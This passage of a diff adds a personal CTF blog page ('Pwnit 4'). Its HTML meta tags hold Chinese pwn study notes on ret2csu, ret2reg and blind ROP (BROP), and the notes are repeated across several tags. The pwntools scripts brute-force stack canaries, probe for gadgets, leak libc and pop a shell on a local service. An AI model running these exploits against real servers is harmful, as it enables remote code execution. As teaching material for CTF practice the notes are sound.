&#39;a&#39; * length +  p64(libc.address+0x45254) + p64(0) * 7s.send(payload)#s.recv()s.interactive()">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/bio-photo.jpg">
+
+
+
+  <meta name="twitter:site" content="@zjgcjy">
+  <meta name="twitter:title" content="Pwnit 4">
+  <meta name="twitter:description" content="  pwn学习资料，来自ctf-wiki。中级 ROPret2csu在 64 位程序中，函数的前 6 个参数是通过寄存器传递的，但是大多数时候，我们很难找到每一个寄存器对应的 gadgets。 这时候，我们可以利用 x64 下的 __libc_csu_init 中的 gadgets。这个函数是用来对 libc 进行初始化操作的，而一般的程序都会调用 libc 函数，所以这个函数一定会存在。我们先来看一下这个函数 (当然，不同版本的这个函数有一定的区别)  从+90 一直到结尾，我们可以利用栈溢出构造栈上数据来控制 rbx,rbp,r12,r13,r14,r15 寄存器的数据。  从 +64 到 +70，我们可以将 r15 赋给 rdx, 将 r14 赋给 rsi，将 r13d 赋给 edi（需要注意的是，虽然这里赋给的是 edi，但其实此时 rdi 的高 32 位寄存器值为 0（自行调试），所以其实我们可以控制 rdi 寄存器的值，只不过只能控制低 32 位），而这三个寄存器，也是 x64 函数调用中传递的前三个寄存器。此外，如果我们可以合理地控制 r12 与 rbx，那么我们就可以调用我们想要调用的函数。比如说我们可以控制 rbx 为 0，r12 为存储我们想要调用的函数的地址。  从 +77 到 +86，我们可以控制 rbx 与 rbp 的之间的关系为 rbx+1 == rbp，这样我们就不会执行 loc_400600，进而可以继续执行下面的汇编程序。这里我们可以简单的设置 rbx=0，rbp=1。以蒸米的一步一步学 ROP 之 linux_x64 篇中 level5 为例进行介绍。这个题就是个简单的栈溢出，但是要ret2libc的话，需要leak info，由于只有read和write函数，x64位下用write来打印GOT表需要3个参数，这就要我们控制rdi，rsi和rdx。而我们用rop工具并不能找到这么多gadget。所以我们可以使用lib2csu来控制regs，继而ret2libc。脚本如下，csu用来进行ret2csu，参数用于glibc2.28，其实和一般的ret2libc差不多，区别是没有用来rdx的gadget。# r12(r13, r14, r15) -&gt; retdef csu(offset, r12, r13, r14, r15, ret, rbx = 0, rbp = 1):  csu_first = 0x04011ea  csu_second = 0x04011d0  # First step  # pop rbx, rbp, r12, r13, r14, r15        # Second step    # rdx = r15    # rsi = r14    # rdi = edi = r13d    # rbx = 0, rbp = 1    # call r12	payload = &#39;a&#39; * offset + p64(csu_first)	payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)	payload += p64(csu_second)	payload += &#39;b&#39; * 0x38	payload += p64(ret)	s.sendline(payload)	sleep(0.5)def main():	s.recv()	csu(136, elf.got[&#39;write&#39;], 1, elf.got[&#39;write&#39;], 8, elf.sym[&#39;main&#39;])	libc.address = u64(s.recv(8)) - libc.symbols[&#39;write&#39;]	log.success(&quot;libc.address -&gt; {:#x}&quot;.format(libc.address))		s.recv()	s.sendline(flat([cyclic(136), libc.address + 0x45254], 0,0,0,0,0,0,0))	#s.recv()	s.interactive()在上面的时候，我们直接利用了这个通用 gadgets，其输入的字节长度为 128。但是，并不是所有的程序漏洞都可以让我们输入这么长的字节。那么当允许我们输入的字节数较少的时候，我们该怎么有什么办法呢？下面给出了几个方法改进 1 - 提前控制 RBX 与 RBP：可以看到在我们之前的利用中，我们利用这两个寄存器的值的主要是为了满足 cmp 的条件，并进行跳转。如果我们可以提前控制这两个数值，那么我们就可以减少 16 字节，即我们所需的字节数只需要 112。改进 2 - 多次利用：其实，改进 1 也算是一种多次利用。我们可以看到我们的 gadgets 是分为两部分的，那么我们其实可以进行两次调用来达到的目的，以便于减少一次 gadgets 所需要的字节数。但这里的多次利用需要更加严格的条件  漏洞可以被多次触发  在两次触发之间，程序尚未修改 r12-r15 寄存器，这是因为要两次调用。当然，有时候我们也会遇到一次性可以读入大量的字节，但是不允许漏洞再次利用的情况，这时候就需要我们一次性将所有的字节布置好，之后慢慢利用。总结一下，在上面的 libc_csu_init 中我们主要利用了以下寄存器  利用尾部代码控制了 rbx，rbp，r12，r13，r14，r15。  利用中间部分的代码控制了 rdx，rsi，edi。ret2reg  查看溢出函返回时哪个寄存值指向溢出缓冲区空间  然后反编译二进制，查找 call reg 或者 jmp reg 指令，将 EIP 设置为该指令地址  reg 所指向的空间上注入 Shellcode (需要确保该空间是可以执行的，但通常都是栈上的)BROPBROP 是没有对应应用程序的源代码或者二进制文件下，对程序进行攻击，劫持程序的执行流。  源程序必须存在栈溢出漏洞，以便于攻击者可以控制程序流程。  服务器端的进程在崩溃之后会重新启动，并且重新启动的进程的地址与先前的地址一样（这也就是说即使程序有 ASLR 保护，但是其只是在程序最初启动的时候有效果）。目前 nginx, MySQL, Apache, OpenSSH 等服务器应用都是符合这种特性的。在 BROP 中，基本的遵循的思路如下  判断栈溢出长度          暴力枚举        Stack Reading          获取栈上的数据来泄露 canaries，以及 ebp 和返回地址。        Blind ROP          找到足够多的 gadgets 来控制输出函数的参数，并且对其进行调用，比如说常见的 write 函数以及 puts 函数。        Build the exploit          利用输出函数来 dump 出程序以便于来找到更多的 gadgets，从而可以写出最后的 exploit。      栈溢出长度首先检测输入长度来进行栈溢出。def getBufferLength():    i = 1    while True:        try:            p = remote(&#39;127.0.0.1&#39;, 1111)            p.recvuntil(&#39;\n&#39;)            p.send(i * &#39;a&#39;)            output = p.recv()            p.close()            if not output.startswith(&#39;No password&#39;):                return i - 1            else:                i += 1        except EOFError:            p.close()            return i - 1print getBufferLength()canary保护然后要绕过canary的保护，这里就采用爆破的方式，由于canary的最低为都是0，32位程序只要爆破256*3次就行了。代码如下，没运行过，应该没问题：for i in xrange(256):    s = remote(&#39;127.0.0.1&#39;, 1234)	s.recv()	# offset = 50	payload = &quot;a&quot;*50+&#39;\x00&#39;+chr(i)	s.send(payload)	try:		print i		out = s.recv()	except EOFError:		s.close()	else:		print out		print &#39;*&#39;*8+ hex(i)+ &#39;*&#39;*8		s.close()在爆破完canary之后，我们就要控制返回地址来泄露整个程序，一般通过wrtie和puts函数，而puts会截断，write函数需要的参数又多，两者都不简单，这里使用write函数进行介绍，而最简单的执行 write 函数的方法就是构造系统调用。pop rdi; ret # socketpop rsi; ret # bufferpop rdx; ret # lengthpop rax; ret # write syscall numbersyscall但通常来说，这样的方法都是比较困难的，因为想要找到一个 syscall 的地址基本不可能。。。我们可以通过转换为找 write 的方式来获取。write函数一般可以在plt表中找到，三个参数rdi，rsi，rdx的前两个可以在libc2csu中，而在程序中rdx一般不为0，因为这个参数是用来输出长度的。所以我们先要进行寻找gadgets，然后再去寻找plt表中的各个函数。寻找 GADGETS首先，我们来想办法寻找 gadgets。此时，由于不知道程序具体长什么样，所以我们只能通过简单的控制程序的返回地址为自己设置的值，从而而来猜测相应的 gadgets。而当我们控制程序的返回地址时，一般有以下几种情况。  程序直接崩溃  程序运行一段时间后崩溃  程序一直运行而并不崩溃为了寻找合理的 gadgets，我们首先要找到一个可以使程序保持一个状态的地址，称为stop gadget，当程序的执行这段代码时，程序会进入无限循环，这样使得攻击者能够一直保持连接状态。他的意思就如下图所示，当我们在进行gadget测试时候，假如我们测试到了gadget，ret指令会将栈中的地址作为返回地址，也就是说，如果我们不在进行测试的gadget后面附上stop gadget，程序的运行状态是不可知的，我们必须使用一个可控的程序状态。比如说再次跳转到主函数，这样我们又能重复这一次gadget的测试操作，进而找到我们需要的gadget。检测代码如下：# log in filedef log_in_file(addr):    f = open(&#39;gadget.txt&#39;,&#39;a&#39;)    f.write(&quot;gadget addr : %#x\n&quot; % addr)    f.close()def get_hang_addr(addr):    p = remote(&#39;127.0.0.1&#39;,1111)    payload = &quot;A&quot; * 72 + p64(addr)    p.recvuntil(&#39;\n&#39;)    p.send(payload)    try:        output = p.recv()        log.info(&quot;alive ! at 0x%x&quot; % addr)        log_in_file(addr)        p.close()    except EOFError as e:         p.close()        log.info(&quot;dead connection! at 0x%x&quot; % addr)    else:    	p.close()    	log.info(&quot;else at 0x%x&quot; % addr)addr = 0x00400000while True:	get_hang_addr(addr)	addr+=1不放心的话，我们可以对检测出来的gadget进行手工检测，一般都选用靠近主函数入口的地址，这样可以让程序再运行一次。这里论文中定义了3种状态：  Probe 探针，位于ret地址处，也就是我们想要探测的代码地址。一般来说，都是 64 位程序，可以直接从 0x400000 尝试，如果不成功，有可能程序开启了 PIE 保护，再不济，就可能是程序是 32 位了。  Stop ret地址后面经过预期几个gadget处的位置，不会使得程序崩溃的 stop gadget 的地址。  Trap stop gadget之前和之后的部分填充的内容，可以导致程序崩溃的地址。我们可以通过在栈上摆放不同顺序的Stop 与 Trap 从而来识别出正在执行的指令。因为执行 Stop 意味着程序不会崩溃，执行 Trap 意味着程序会立即崩溃。这里给出几个例子  probe,stop,traps(traps,traps,…)          我们通过程序崩溃与否 ，可以找到不会对栈进行 pop 操作的 gadget，如                  ret          xor eax,eax; ret                      probe,trap,stop,traps          我们可以通过这样的布局找到只是弹出一个栈变量的 gadget。如                  pop rax; ret          pop rdi; ret                      probe, trap, trap, trap, trap, trap, trap, stop, traps          我们可以通过这样的布局来找到弹出 6 个栈变量的 gadget，也就是与 brop gadget 相似的 gadget。这里感觉原文是有问题的，比如说如果遇到了只是 pop 一个栈变量的地址，其实也是不会崩溃的，，这里一般来说会遇到两处比较有意思的地方                  plt 处不会崩，，          _start 处不会崩，相当于程序重新执行。                    # get ret2csu_addrdef get_gadgets_addr(stop_gadget):	address = 0x400750	while True:		p = remote(&#39;127.0.0.1&#39;,1111)		payload = &quot;A&quot; * 72 + p64(address) + p64(1) + p64(2) + p64(3) + p64(4) + p64(5) + p64(6) + p64(stop_gadget)		p.recvuntil(&#39;\n&#39;)		p.send(payload)		try:		    output = p.recv()		    log.info(&quot;find gadgets at 0x%x&quot; % address)		    p.close()		    return		except EOFError as e: 		    address += 1		    p.close()		    log.info(&quot;dead connection! at 0x%x&quot; % address)		p.close()		    get_gadgets_addr(0x004006ad)到这里我们就确定了stop gadget 和 ret2csu的地址。寻找plt如下图所示，程序的 plt 表具有比较规整的结构，每一个 plt 表项都是 16 字节。而且，在每一个表项的 6 字节偏移处，是该表项对应的函数的解析路径，即程序最初执行该函数的时候，会执行该路径对函数的 got 地址进行解析。此外，对于大多数 plt 调用来说，一般都不容易崩溃，即使是使用了比较奇怪的参数。所以说，如果我们发现了一系列的长度为 16 的没有使得程序崩溃的代码段，那么我们有一定的理由相信我们遇到了 plt 表。除此之外，我们还可以通过前后偏移 6 字节，来判断我们是处于 plt 表项中间还是说处于开头。ppppppr_addr = 0x4007aagadget2 = ppppppr_addr - 0x1agadget1 = ppppppr_addrpop_rid_ret = ppppppr_addr + 9stop_gadget = 0x004006ad# get puts@pltdef get_puts_addr(length, rdi_ret, stop_gadget):    addr = 0x400000    while 1:        print hex(addr)        sh = remote(&#39;127.0.0.1&#39;, 1111)        sh.recvuntil(&#39;\n&#39;)        payload = &#39;A&#39; * length + p64(rdi_ret) + p64(0x400000) + p64(addr) + p64(stop_gadget)        sh.send(payload)        try:            content = sh.recv()            if content.startswith(&#39;\x7fELF&#39;):                print &#39;find puts@plt addr: 0x%x&#39; % addr                return hex(addr)            sh.close()            addr += 1        except Exception as e:            sh.close()            addr += 1print get_puts_addr(72, pop_rid_ret, stop_gadget)#puts_plt = 0x400560在进行测试时，我得到了这么几个地址的值，为了确定哪个是真正的puts@plt的地址，我们可以进行分析。0x4005550x4005570x40055c0x40055e0x40055f0x4005600x4005610x400566  在puts@plt没有解析过时，plt表中函数第一条指令是跳转到对应的got表中，此时got表中存储的是plt表中的第二条指令，然后进行压栈，并跳转到plt表首，然后进入dl_resolve进行延时绑定，将函数地址写入got表中。  在puts@plt经过解析后，plt表中的函数地址第一条仍然不变，但是got表中的值变成了真正的函数值，所以此时会直接跳转到真正的函数入口处，不会再跳转到plt表中。所以，基于elf文件的延时绑定机制，对于上面我们得到的疑似puts@plt的地址，前面几个肯定是在plt表项前面的指令，这样顺序执行指令也不有问题。而最后一个能真确执行puts的地址，肯定是属于puts@plt没有解析的情况下，程序进入plt表首，然后调用dl_resolve来调用puts函数，所以最后一个地址是puts@plt的第二条指令，即压栈操作，而压栈操作是在plt表函数的第二条位置，偏移量是6，所以我们就能得到正确的puts_plt的函数地址是0x400560。dump文件在我们可以调用 puts 函数后，我们可以泄露 puts 函数的地址，进而获取 libc 版本，从而获取相关的 system 函数地址与 / bin/sh 地址，从而获取 shell。我们从 0x400000 开始泄露 0x1000 个字节，这已经足够包含程序的 plt 部分了。代码如下：# dump filedef leak(length, rdi_ret, puts_plt, leak_addr, stop_gadget):    sh = remote(&#39;127.0.0.1&#39;, 1111)    payload = &#39;a&#39; * length + p64(rdi_ret) + p64(leak_addr) + p64(puts_plt) + p64(stop_gadget)    sh.recvuntil(&#39;\n&#39;)    sh.send(payload)    try:        data = sh.recv()        sh.close()        try:            data = data[:data.index(&quot;WelCome&quot;)]        except Exception:            data = data        #print len(data)        if data == &quot;&quot;:            data = &#39;\x00&#39;        return data    except Exception:        sh.close()        return Nonelength = 72brop_gadget = 0x4007aastop_gadget = 0x4006ADputs_plt = 0x400560addr = 0x400500rdi_ret = brop_gadget + 9result = &quot;&quot;while addr &lt; 0x400600:    print hex(addr)    data = leak(length, rdi_ret, puts_plt, addr, stop_gadget)    if data is None:        continue    else:    	if data == &#39;\x0a&#39;:    		data = &#39;\x00&#39;        result += data    addr += len(data)with open(&#39;code&#39;, &#39;wb&#39;) as f:    f.write(result)这说明，puts@got 的地址为 0x601018。然后我们进行整体的程序利用就行了。exploit#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *from sys import *import osip = &#39;127.0.0.1&#39; port = 1111context.log_level = &#39;debug&#39;context.terminal = [&#39;gnome-terminal&#39;, &#39;-x&#39;, &#39;sh&#39;, &#39;-c&#39;]s = remote(ip,port)elf = ELF(&quot;./brop&quot;)libc = elf.libc#length = getbufferflow_length()length = 72#stop_gadget = get_stop_addr(length)stop_gadget = 0x4006ad#ppppppr_addr = find_brop_gadget(length, stop_gadget)ppppppr_addr = 0x4007aagadget1 = ppppppr_addrgadget2 = ppppppr_addr - 0x1ardi_ret = ppppppr_addr + 9#puts_plt = get_puts_plt(length, rdi_ret, stop_gadget)puts_plt = 0x400560# puts_got = 0x601018puts_got = 0x601018#s = gdb.debug(&#39;./brop&#39;,&#39;&#39;&#39;#b main#&#39;&#39;&#39;)s.recv()payload = &#39;a&#39; * length + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(stop_gadget)s.send(payload)puts_addr = u64(s.recv(6).ljust(8, &#39;\x00&#39;))log.success(&quot;puts_addr -&gt; {:#x}&quot;.format(puts_addr))libc.address = puts_addr - libc.symbols[&#39;puts&#39;]log.success(&quot;libc address -&gt; {:#x}&quot;.format(libc.address))s.recv()payload = &#39;a&#39; * length +  p64(libc.address+0x45254) + p64(0) * 7s.send(payload)#s.recv()s.interactive()">
+  <meta name="twitter:url" content="http://localhost:4000/posts/2019-03/Pwnit-4.html">
+
+  
+    <meta name="twitter:card" content="summary">
+    
+      <meta name="twitter:image" content="http://localhost:4000/assets/images/bio-photo.jpg">
+    
+  
+
+  
+
+
+
+  <meta property="article:published_time" content="2019-03-02T21:26:00+08:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/posts/2019-03/Pwnit-4.html">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": "Blogger",
+      "url": "http://localhost:4000/",
+      "sameAs": ["https://twitter.com/","https://github.com/"]
+    
+  }
+</script>
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="My way, though far away Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single">
+    <nav class="skip-links">
+  <h2 class="screen-reader-text">Skip links</h2>
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/apple-touch-icon.png" alt=""></a>
+        
+        <a class="site-title" href="/">
+          ZJGCJY
+          <span class="site-subtitle">My way, though far away</span>
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/year-archive/" >Posts</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Tags</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/collection-archive/" >Collections</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/" >About</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="/categories/#posts" itemprop="item"><span itemprop="name">Posts</span></a>
+          <meta itemprop="position" content="2" />
+        </li>
+        <span class="sep">/</span>
+      
+    
+      
+      
+        
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="/categories/#2019-03" itemprop="item"><span itemprop="name">2019 03</span></a>
+          <meta itemprop="position" content="3" />
+        </li>
+        <span class="sep">/</span>
+      
+    
+      
+      
+        <li class="current">Pwnit 4</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/me.jpg" alt="zjgcjy" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">zjgcjy</h3>
+    
+    
+      <div class="author__bio" itemprop="description">
+        <p>IIE UCAS, CTFer, Binarian</p>
+
+      </div>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">BeiJing China</span>
+        </li>
+      
+
+      
+        
+          
+            <li><a href="https://zjgcjy.github.io" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-link" aria-hidden="true"></i> Website</a></li>
+          
+        
+          
+            <li><a href="mailto:zjgcjy@gmail.com" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i> Email</a></li>
+          
+        
+          
+            <li><a href="https://github.com/zjgcjy" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
+          
+        
+          
+            <li><a href="https://twitter.com/zjgcjy" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter</a></li>
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Pwnit 4">
+    <meta itemprop="description" content="  pwn学习资料，来自ctf-wiki。中级 ROPret2csu在 64 位程序中，函数的前 6 个参数是通过寄存器传递的，但是大多数时候，我们很难找到每一个寄存器对应的 gadgets。 这时候，我们可以利用 x64 下的 __libc_csu_init 中的 gadgets。这个函数是用来对 libc 进行初始化操作的，而一般的程序都会调用 libc 函数，所以这个函数一定会存在。我们先来看一下这个函数 (当然，不同版本的这个函数有一定的区别)  从+90 一直到结尾，我们可以利用栈溢出构造栈上数据来控制 rbx,rbp,r12,r13,r14,r15 寄存器的数据。  从 +64 到 +70，我们可以将 r15 赋给 rdx, 将 r14 赋给 rsi，将 r13d 赋给 edi（需要注意的是，虽然这里赋给的是 edi，但其实此时 rdi 的高 32 位寄存器值为 0（自行调试），所以其实我们可以控制 rdi 寄存器的值，只不过只能控制低 32 位），而这三个寄存器，也是 x64 函数调用中传递的前三个寄存器。此外，如果我们可以合理地控制 r12 与 rbx，那么我们就可以调用我们想要调用的函数。比如说我们可以控制 rbx 为 0，r12 为存储我们想要调用的函数的地址。  从 +77 到 +86，我们可以控制 rbx 与 rbp 的之间的关系为 rbx+1 == rbp，这样我们就不会执行 loc_400600，进而可以继续执行下面的汇编程序。这里我们可以简单的设置 rbx=0，rbp=1。以蒸米的一步一步学 ROP 之 linux_x64 篇中 level5 为例进行介绍。这个题就是个简单的栈溢出，但是要ret2libc的话，需要leak info，由于只有read和write函数，x64位下用write来打印GOT表需要3个参数，这就要我们控制rdi，rsi和rdx。而我们用rop工具并不能找到这么多gadget。所以我们可以使用lib2csu来控制regs，继而ret2libc。脚本如下，csu用来进行ret2csu，参数用于glibc2.28，其实和一般的ret2libc差不多，区别是没有用来rdx的gadget。# r12(r13, r14, r15) -&gt; retdef csu(offset, r12, r13, r14, r15, ret, rbx = 0, rbp = 1):  csu_first = 0x04011ea  csu_second = 0x04011d0  # First step  # pop rbx, rbp, r12, r13, r14, r15        # Second step    # rdx = r15    # rsi = r14    # rdi = edi = r13d    # rbx = 0, rbp = 1    # call r12	payload = &#39;a&#39; * offset + p64(csu_first)	payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)	payload += p64(csu_second)	payload += &#39;b&#39; * 0x38	payload += p64(ret)	s.sendline(payload)	sleep(0.5)def main():	s.recv()	csu(136, elf.got[&#39;write&#39;], 1, elf.got[&#39;write&#39;], 8, elf.sym[&#39;main&#39;])	libc.address = u64(s.recv(8)) - libc.symbols[&#39;write&#39;]	log.success(&quot;libc.address -&gt; {:#x}&quot;.format(libc.address))		s.recv()	s.sendline(flat([cyclic(136), libc.address + 0x45254], 0,0,0,0,0,0,0))	#s.recv()	s.interactive()在上面的时候，我们直接利用了这个通用 gadgets，其输入的字节长度为 128。但是，并不是所有的程序漏洞都可以让我们输入这么长的字节。那么当允许我们输入的字节数较少的时候，我们该怎么有什么办法呢？下面给出了几个方法改进 1 - 提前控制 RBX 与 RBP：可以看到在我们之前的利用中，我们利用这两个寄存器的值的主要是为了满足 cmp 的条件，并进行跳转。如果我们可以提前控制这两个数值，那么我们就可以减少 16 字节，即我们所需的字节数只需要 112。改进 2 - 多次利用：其实，改进 1 也算是一种多次利用。我们可以看到我们的 gadgets 是分为两部分的，那么我们其实可以进行两次调用来达到的目的，以便于减少一次 gadgets 所需要的字节数。但这里的多次利用需要更加严格的条件  漏洞可以被多次触发  在两次触发之间，程序尚未修改 r12-r15 寄存器，这是因为要两次调用。当然，有时候我们也会遇到一次性可以读入大量的字节，但是不允许漏洞再次利用的情况，这时候就需要我们一次性将所有的字节布置好，之后慢慢利用。总结一下，在上面的 libc_csu_init 中我们主要利用了以下寄存器  利用尾部代码控制了 rbx，rbp，r12，r13，r14，r15。  利用中间部分的代码控制了 rdx，rsi，edi。ret2reg  查看溢出函返回时哪个寄存值指向溢出缓冲区空间  然后反编译二进制，查找 call reg 或者 jmp reg 指令，将 EIP 设置为该指令地址  reg 所指向的空间上注入 Shellcode (需要确保该空间是可以执行的，但通常都是栈上的)BROPBROP 是没有对应应用程序的源代码或者二进制文件下，对程序进行攻击，劫持程序的执行流。  源程序必须存在栈溢出漏洞，以便于攻击者可以控制程序流程。  服务器端的进程在崩溃之后会重新启动，并且重新启动的进程的地址与先前的地址一样（这也就是说即使程序有 ASLR 保护，但是其只是在程序最初启动的时候有效果）。目前 nginx, MySQL, Apache, OpenSSH 等服务器应用都是符合这种特性的。在 BROP 中，基本的遵循的思路如下  判断栈溢出长度          暴力枚举        Stack Reading          获取栈上的数据来泄露 canaries，以及 ebp 和返回地址。        Blind ROP          找到足够多的 gadgets 来控制输出函数的参数，并且对其进行调用，比如说常见的 write 函数以及 puts 函数。        Build the exploit          利用输出函数来 dump 出程序以便于来找到更多的 gadgets，从而可以写出最后的 exploit。      栈溢出长度首先检测输入长度来进行栈溢出。def getBufferLength():    i = 1    while True:        try:            p = remote(&#39;127.0.0.1&#39;, 1111)            p.recvuntil(&#39;\n&#39;)            p.send(i * &#39;a&#39;)            output = p.recv()            p.close()            if not output.startswith(&#39;No password&#39;):                return i - 1            else:                i += 1        except EOFError:            p.close()            return i - 1print getBufferLength()canary保护然后要绕过canary的保护，这里就采用爆破的方式，由于canary的最低为都是0，32位程序只要爆破256*3次就行了。代码如下，没运行过，应该没问题：for i in xrange(256):    s = remote(&#39;127.0.0.1&#39;, 1234)	s.recv()	# offset = 50	payload = &quot;a&quot;*50+&#39;\x00&#39;+chr(i)	s.send(payload)	try:		print i		out = s.recv()	except EOFError:		s.close()	else:		print out		print &#39;*&#39;*8+ hex(i)+ &#39;*&#39;*8		s.close()在爆破完canary之后，我们就要控制返回地址来泄露整个程序，一般通过wrtie和puts函数，而puts会截断，write函数需要的参数又多，两者都不简单，这里使用write函数进行介绍，而最简单的执行 write 函数的方法就是构造系统调用。pop rdi; ret # socketpop rsi; ret # bufferpop rdx; ret # lengthpop rax; ret # write syscall numbersyscall但通常来说，这样的方法都是比较困难的，因为想要找到一个 syscall 的地址基本不可能。。。我们可以通过转换为找 write 的方式来获取。write函数一般可以在plt表中找到，三个参数rdi，rsi，rdx的前两个可以在libc2csu中，而在程序中rdx一般不为0，因为这个参数是用来输出长度的。所以我们先要进行寻找gadgets，然后再去寻找plt表中的各个函数。寻找 GADGETS首先，我们来想办法寻找 gadgets。此时，由于不知道程序具体长什么样，所以我们只能通过简单的控制程序的返回地址为自己设置的值，从而而来猜测相应的 gadgets。而当我们控制程序的返回地址时，一般有以下几种情况。  程序直接崩溃  程序运行一段时间后崩溃  程序一直运行而并不崩溃为了寻找合理的 gadgets，我们首先要找到一个可以使程序保持一个状态的地址，称为stop gadget，当程序的执行这段代码时，程序会进入无限循环，这样使得攻击者能够一直保持连接状态。他的意思就如下图所示，当我们在进行gadget测试时候，假如我们测试到了gadget，ret指令会将栈中的地址作为返回地址，也就是说，如果我们不在进行测试的gadget后面附上stop gadget，程序的运行状态是不可知的，我们必须使用一个可控的程序状态。比如说再次跳转到主函数，这样我们又能重复这一次gadget的测试操作，进而找到我们需要的gadget。检测代码如下：# log in filedef log_in_file(addr):    f = open(&#39;gadget.txt&#39;,&#39;a&#39;)    f.write(&quot;gadget addr : %#x\n&quot; % addr)    f.close()def get_hang_addr(addr):    p = remote(&#39;127.0.0.1&#39;,1111)    payload = &quot;A&quot; * 72 + p64(addr)    p.recvuntil(&#39;\n&#39;)    p.send(payload)    try:        output = p.recv()        log.info(&quot;alive ! at 0x%x&quot; % addr)        log_in_file(addr)        p.close()    except EOFError as e:         p.close()        log.info(&quot;dead connection! at 0x%x&quot; % addr)    else:    	p.close()    	log.info(&quot;else at 0x%x&quot; % addr)addr = 0x00400000while True:	get_hang_addr(addr)	addr+=1不放心的话，我们可以对检测出来的gadget进行手工检测，一般都选用靠近主函数入口的地址，这样可以让程序再运行一次。这里论文中定义了3种状态：  Probe 